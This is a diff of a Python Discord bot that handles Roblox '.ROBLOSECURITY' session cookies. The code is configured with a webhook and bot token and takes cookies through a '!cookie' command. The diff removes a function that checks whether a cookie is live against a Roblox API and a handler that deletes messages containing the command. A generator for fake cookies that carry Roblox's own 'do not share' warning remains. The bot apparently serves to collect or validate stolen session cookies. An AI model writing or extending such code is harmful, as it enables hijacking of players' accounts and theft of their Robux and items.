@@ -13,23 +13,12 @@ WebHook = data["Webhook"]
 BotToken = data["Token"]
 Company = data["Company"]
 letters = 'ABCDEF'
-def checkCookie(cookie):
-    check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)})
-    if check.status_code == 200:
-        return True
-    else:
-        return False
 intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
 def generateCookie():
     return intro +  ''.join(random.choices(letters + string.digits, k=732))
 bot = commands.Bot(command_prefix=Prefix,intents=discord.Intents.all())
 Cooldown = []
 bot.remove_command("help")
-@bot.event
-async def on_message(msg):
-    if "!cookie" in str(msg):
-        time.sleep(0.2)
-        await msg.delete(msg)
 @bot.command()
 async def cookie(ctx,*,cookie):
     if ctx.author.id in Cooldown:
